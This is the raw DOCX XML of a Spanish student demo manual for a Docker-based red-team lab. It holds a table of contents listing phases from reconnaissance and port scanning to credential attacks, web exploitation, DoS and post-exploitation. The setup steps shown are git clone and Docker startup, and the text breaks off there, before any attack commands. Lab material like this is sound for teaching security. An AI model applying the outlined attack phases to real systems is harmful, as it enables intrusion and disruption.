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0D50F4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="44"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Manual de Demostración — Red Team Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE7A425" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>Redes 2 · Ciclo 2026 · Entrega 23 mayo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6790CA86" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38B66187" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47C852A2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>Índice</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B16DB7A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66EED439" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[Requisitos previos](#1-requisitos-previos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7350871D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Levantar el entorno](#2-levantar-el-entorno)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735C5FC3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Verificar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conectividad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> (smoke tests</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>#3-verificar-conectividad)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D2C256" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[Fase 1 — Reconocimiento](#4-fase-1--reconocimiento)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657638E1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Fase 2 — Escaneo de puertos](#5-fase-2--escaneo-de-puertos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0370EF33" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Fase 3 — Enumeración HTTP](#6-fase-3--enumeración-http)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E953ABE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">[Fase 4 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Credenciales</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>#7-fase-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>4--credenciales</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFB3BE0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Fase 5 — Explotación web](#8-fase-5--explotación-web)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A34EAB4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Fase 6 — DoS (coordinado con Blue Team)](#9-fase-6--dos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1CA534" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">[Fase 7 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Post-explotación</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>](#10-fase-7--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>post-explotación</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FA7D02" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">[Ver </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>evidencias</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>#11-ver-evidencias)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189A6349" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Detener el entorno](#12-detener-el-entorno)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DFABC7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[Referencia rápida de comandos](#13-referencia-rápida)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CDDD58" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B129C0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>1. Requisitos previos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9B67BD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E7B851" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Software necesario en el equipo del presentador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7C2578" w14:paraId="48D84A05" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="2B96E29B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Software</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="56800C5B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Versión mínima</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="0966D3CE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Descarga</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="3005E44C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C9C86E5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Docker Desktop</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0BEFDA4F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>4.x</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0B96B762" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>docker.com/products/docker-desktop</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="041E7CA8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="6D140C33" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Git</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="35250381" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2.x</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="680432D1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>git-scm.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="1C2ED03A" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="20A0EEC2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Terminal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58F44504" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>PowerShell 7+ o CMD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E08A1AA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>incluido en Windows</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4AF6EFE6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="7E5E388C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Clonar el repositorio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAC4592" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ejecutar </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>una sola vez</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> en la máquina donde se hará la demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF5F5D7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>git clone https://github.com/govandoh/Red-team-env-project.git C:\Project-Red-Team</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE50011" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4840402D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63EADA6F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Si el repositorio ya está clonado, actualizar a la versión más reciente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CAB73B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E42348" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>git pull origin master</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152A5AA0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14E35AF5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="712530A2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>2. Levantar el entorno</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC7A991" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18C0FD1D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Todos los comandos de esta sección se ejecutan en </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>PowerShell</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> desde </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>C:\Project-Red-Team</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBB086B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>2.1 Iniciar Docker Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283EC445" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrir Docker Desktop y esperar a que el ícono de la bandeja del sistema muestre "Docker Desktop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> running".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFC44EA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
